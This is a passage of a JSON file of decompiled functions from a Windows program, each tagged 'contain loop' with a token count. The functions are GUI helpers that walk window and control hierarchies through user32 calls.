        "decompiled_code": "\nvoid __fastcall fcn.0043a818(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0043c3c4();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.0043c3d4();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.004398b8();\n                }\n            }\n            else {\n                iVar2 = fcn.0043c3d4();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.0043c3d4();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "0043c48c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c48c(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0043c3c4();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0043c3d4();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0043c8f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043c8f0(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0043c3c4();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0043c3d4();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0043c984": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0043c984(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 74
    },
    "0043dc10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043dc10(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004423f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004423f4(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.00414eec();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 155
    },
    "0044242c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044242c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.0044d1c8();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 106
    },
    "00442510": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00442510(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStackY20;\n    \n    iVar5 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStackY20 = 0x44252b;\n            piVar2 = fcn.00414eec();\n            iVar5 = *piVar2;\n        }\n        else {\n            iStackY20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 = iVar3,  iVar5 == 0 && (iVar4 != 0))) {\n                cVar1 = fcn.004423f4();\n                if (cVar1 == '\\0') {\n                    iVar3 = sub.user32.dll_GetWindow();\n                    iStackY20 = iVar4;\n                }\n                else {\n                    iVar5 = **(*(in_EAX + 4) + iStackY20 * 4);\n                    iVar3 = iVar4;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStackY20, iVar5);\n}\n",
        "token_count": 298
    },
    "00442f94": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00442f94(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.00442f34(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 107
    },
    "00443ab8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00443ab8(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.00441fd4(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "00445108": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00445108(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004040e4();\n            if (cVar1 != '\\0') {\n                fcn.0045d100();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "004492c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004492c0(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 91
    },
    "0044e6dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e6dc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xdfff;\n    }\n    else {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x2000;\n    }\n    if ((*(in_EAX + 0x1d0) != 0) && (iVar1 = *(*(in_EAX + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00414eec();\n            fcn.0044e6dc();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0044f36c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044f36c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0044f408();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 102
    },
    "0044f3d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044f3d0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 96
    },
    "0044f3e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044f3e4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.0044fa2c();\n    while (iVar1 != 0) {\n        iVar1 = fcn.0044fa04();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 91
    },
    "0044f408": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.0044f408(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.0044fa2c(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.0044f408();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 163
    },
    "0044f77c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f77c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.0044fa04();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 123
    },
    "0044f954": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044f954(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 69
    },
    "0044f964": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044f964(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0044f950();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.0044f3d0();\n        if (0 < iVar2) {\n            fcn.0044f954();\n            fcn.0044f964();\n        }\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0044f9a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044f9a4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.0044f928();\n        iVar3 = fcn.0044f440();\n        if (iVar2 < iVar3) {\ncode_r0x0044f9d8:\n            fcn.0044f60c();\n            fcn.0044fce4(0x4517e0, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.0044f928();\n            iVar3 = fcn.0044f488();\n            if (iVar3 < iVar2) goto code_r0x0044f9d8;\n        }\n        fcn.0044f9a4();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 238
    },
    "0044fa10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044fa10(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0044f408();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 119
    },
    "0044fca8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fca8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0044fca8(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0044fca8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00450e00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450e00(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.00450e00(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.00450e00(arg_8h);\n    }\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 101
    },
    "004515d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004515d8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.0044fa04();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.0044f408();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.0044f950();\n                }\n                else {\n                    fcn.0044f928();\n                    fcn.0044f950();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.0044fa2c();\n        fcn.004515d8(iVar2);\n        fcn.0044fa04();\n        fcn.004515d8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "00451a4c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451a4c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0044f388();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.0044f440();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.0044f408();\n        if (cVar1 == '\\0') {\n            fcn.00451a4c(arg_8h);\n        }\n    }\n    iVar2 = fcn.0044fa10();\n    if (iVar2 != 0) {\n        fcn.0044fa10();\n        fcn.0044f964();\n    }\n    fcn.0044fce4(0x4517e0, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 257
    },
    "00454244": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454244(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.00414eec();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.00414dd8();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00455884": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455884(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.004051b0(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404108();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00404df4();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00455c48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455c48(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404108();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x74))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00455de0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00455de0(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 220
    },
    "004580c8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004580c8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.00402d00();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0045b858": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0045b858(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.0044d1c8(2);\n    iVar2 = (***0x492a7c)(uVar1);\n    iVar3 = fcn.0045fc50();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.0045fc3c();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.0045fc3c();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00460ba0();\n    iVar3 = fcn.0045fc50();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.0045fc3c();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.0045fc3c();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 285
    },
    "0045fe4c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045fe4c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar1 = fcn.0045fc50();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0045fc3c();\n            if (param_2 == *(iVar2 + 4)) {\n                uStack20 = fcn.0045fc3c();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 163
    },
    "00460b68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00460b68(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 0x58) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00414eec();\n            fcn.00403f58();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(*0x496588 + 0x58) + 8))();\n    return;\n}\n",
        "token_count": 124
    },
    "00460bc4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00460bc4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0045fc50();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0045fc3c();\n            cVar1 = fcn.0045f9b0();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.0045fc3c();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00460ba0();\n    iVar2 = fcn.0045fc50();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0045fc3c();\n            cVar1 = fcn.0045f9b0();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.0045fc3c();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 261
    },
    "00461340": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461340(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00405ca4();\n    if (-1 < iVar1) {\n        iVar1 = iVar1 + 1;\n        iVar2 = 0;\n        do {\n            if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n                *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = 0;\n                *(*(in_EAX + 0xd0) + iVar2 * 0xc) = 0xffffffff;\n                return;\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00462d58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00462d58(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.0045fc9c();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.0045fc88();\n            cVar1 = fcn.0044d568();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.0044d1c8();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.0044d1c8();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xec))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00462fa4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00462fa4(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.0045fc80();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.0045fc6c();\n            fcn.00446870(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00463d3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00463d3c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetCapture();\n    if (iVar1 == 0) {\n        iVar1 = *(in_EAX + 0x44);\n        if ((iVar1 == 0) || (*param_2 != *(iVar1 + 0x29c))) {\n            iVar1 = fcn.00441fd4();\n            while ((iVar1 == 0 && (iVar2 = sub.user32.dll_GetParent(),  iVar2 != 0))) {\n                iVar1 = fcn.00441fd4();\n            }\n        }\n        if (iVar1 != 0) {\n            uVar3 = fcn.00404154();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 213
    },
    "0046ea38": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ea38(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x2b0) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00414eec();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0046eaf4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046eaf4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar1 = fcn.0046eb5c();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0046eb44();\n            if ((iVar2 == *(param_2 + 0x30)) && (in_EAX == *(param_2 + 0x94))) {\n                uStack20 = fcn.0046eb44();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 188
    },
    "004724d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004724d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x268) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.004040e4();\n            if (cVar1 != '\\0') {\n                fcn.00472478();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00485e7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00485e7c(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint in_EDX;\n    uint var_4h;\n    \n    if (in_ECX < arg_8h) {\n        do {\n            fcn.004837d4(in_EDX, 1, in_ECX);\n            in_ECX = in_ECX + 1;\n        } while (in_ECX < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0048a9d0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0048a9d0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar4 = 9;\n    do {\n        var_4h = 0;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_14h = 0x48af37;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048a9d0::var_18h;\n    var_1ch = 0x48aa03;\n    var_8h = in_EAX;\n    iVar4 = fcn.00404108();\n    iVar4 = *(iVar4 + 0xc);\n    if (iVar4 == 1) {\n        var_1ch = 0x48aa35;\n        cVar1 = (**(**(var_8h + 0x3b0) + 0x3c))();\n        uVar5 = cVar1 == '\\0';\n        if (!uVar5) {\n            var_1ch = 0x48aa4f;\n            fcn.004372f8();\n            var_1ch = 0x48aa5a;\n            fcn.00409454();\n            var_1ch = 0x48aa65;\n            fcn.00408960();\n            var_1ch = 0x48aa72;\n            fcn.004051b0();\n            if (!uVar5) {\n                var_1ch = 0x48aa81;\n                fcn.004051b0();\n                if (!uVar5) {\n                    var_1ch = 0x48ab0d;\n                    fcn.004051b0();\n                    if (uVar5) {\n                        var_1ch = 0x48ab20;\n                        fcn.004372f8();\n                        var_1ch = 0x48ab37;\n                        fcn.00423f74();\n                    }\n                    var_1ch = 0x48ab4b;\n                    piVar3 = fcn.00423eac();\n                    var_1ch = 0x48ab50;\n                    (**(*piVar3 + 0x2c))();\n                    var_1ch = 0x48ab58;\n                    fcn.00408d88();\n                    var_1ch = var_24h;\n                    var_20h = 0x48af7c;\n                    var_24h = 0x48ab74;\n                    piVar3 = fcn.00423eac();\n                    var_24h = 0x48ab79;\n                    (**(*piVar3 + 0x20))();\n                    var_24h = 0x48ab81;\n                    fcn.00408d88();\n                    fcn.00405124();\n                    fcn.004455dc();\n                    fcn.0048b31c();\n                    cVar1 = (**(**(var_8h + 0x44c) + 0xd8))();\n                    if (cVar1 != '\\0') {\n                        var_1ch = 0x48abd1;\n                        fcn.0048af80();\n                    }\n                    goto code_r0x0048aedd;\n                }\n            }\n            var_1ch = 0x48aa9a;\n            var_ch = fcn.00476d50();\n            var_20h = 0x48aaf9;\n            var_24h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.0048a9d0::var_24h;\n            var_1ch = &stack0xfffffffc;\n            fcn.004372f8();\n            (**(*var_ch + 0x4c))();\n            piVar3 = fcn.00423eac();\n            (**(*piVar3 + 8))();\n            *in_FS_OFFSET = var_24h;\n            var_1ch = 0x48ab00;\n            var_20h = 0x48aaf8;\n            fcn.00403f58();\n            return;\n        }\n    }\n    else if (iVar4 == 2) {\n        var_1ch = 0x48abfc;\n        cVar1 = (**(**(var_8h + 0x3b0) + 0x3c))();\n        uVar5 = cVar1 == '\\0';\n        if (!uVar5) {\n            var_1ch = 0x48ac25;\n            fcn.004372f8();\n            var_1ch = 0x48ac30;\n            fcn.00409454();\n            var_1ch = 0x48ac3b;\n            fcn.00408960();\n            var_1ch = 0x48ac48;\n            fcn.004051b0();\n            if (!uVar5) {\n                var_1ch = 0x48ac57;\n                fcn.004051b0();\n                if (!uVar5) {\n                    var_1ch = 0x48ad2b;\n                    